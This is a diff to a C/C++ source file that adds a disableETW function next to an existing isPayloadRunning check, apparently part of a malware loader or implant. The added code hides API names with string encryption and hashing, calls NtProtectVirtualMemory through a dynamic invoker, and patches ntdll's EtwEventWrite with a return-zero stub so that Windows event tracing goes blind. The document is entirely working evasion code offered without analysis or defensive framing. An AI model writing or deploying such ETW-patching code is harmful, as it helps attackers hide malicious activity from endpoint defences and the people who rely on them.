@@ -433,3 +433,38 @@ BOOLEAN isPayloadRunning() {
 	}
 	return FALSE;
 }
+
+BOOLEAN disableETW() {
+	DWORD oldProtect = 0;
+	char * etwWriteStr = _strdup(ENCRYPT_STR("EtwEventWrite"));
+	SIZE_T size = 0x1000;
+
+	HMODULE Ntd1l = GetMoudlebyName(_wcsdup(ENCRYPT_WSTR("ntdll.dll")));
+	LPVOID EtwEventWrite = GetProcAddressbyHASH(Ntd1l, EtwEventWrite_Hashed);
+	
+	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
+		NtProtectVirtualMemoryStruct.funcHash,
+		(HANDLE)-1, &EtwEventWrite, &size, PAGE_EXECUTE_READWRITE, &oldProtect);
+
+
+	if (!NT_SUCCESS(status)) return FALSE;
+
+#ifdef _WIN64
+	memcpy(EtwEventWrite, ENCRYPT_STR("\x48\x33\xc0\xc3"), 4);
+#else
+	memcpy(EtwEventWrite, ENCRYPT_STR("\x33\xc0\xc2\x14\x00"), 5);
+#endif
+
+	status = dynamicInvoker.Invoke<NTSTATUS>(NtProtectVirtualMemoryStruct.funcAddr,
+		NtProtectVirtualMemoryStruct.funcHash,
+		(HANDLE)-1, &EtwEventWrite, &size, oldProtect, &oldProtect);
+
+	status = dynamicInvoker.Invoke<NTSTATUS>(NtFlushInstructionCacheStruct.funcAddr,
+		NtFlushInstructionCacheStruct.funcHash,
+		(HANDLE)-1, EtwEventWrite, size);
+	if (!NT_SUCCESS(status)) return FALSE;
+
+
+	return TRUE;
+
+}
